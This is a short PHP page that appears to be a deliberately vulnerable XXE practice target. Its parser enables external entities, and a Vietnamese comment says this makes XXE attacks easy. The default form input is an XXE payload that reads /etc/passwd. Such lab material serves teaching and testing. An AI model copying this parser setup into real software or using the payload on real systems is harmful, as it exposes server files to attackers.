<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml = $_POST['xml'] ?? '';
    libxml_disable_entity_loader(false); // Bật entity loader để dễ tấn công XXE
    $dom = new DOMDocument();
    $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    echo "<pre>";
    print_r($dom->getElementsByTagName('data')->item(0)->nodeValue);
    echo "</pre>";
}
?>

<form method="POST">
    <textarea name="xml" rows="10" cols="60">
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>
  <data>&xxe;</data>
</foo>
    </textarea><br>
    <button>Submit XML</button>
</form>
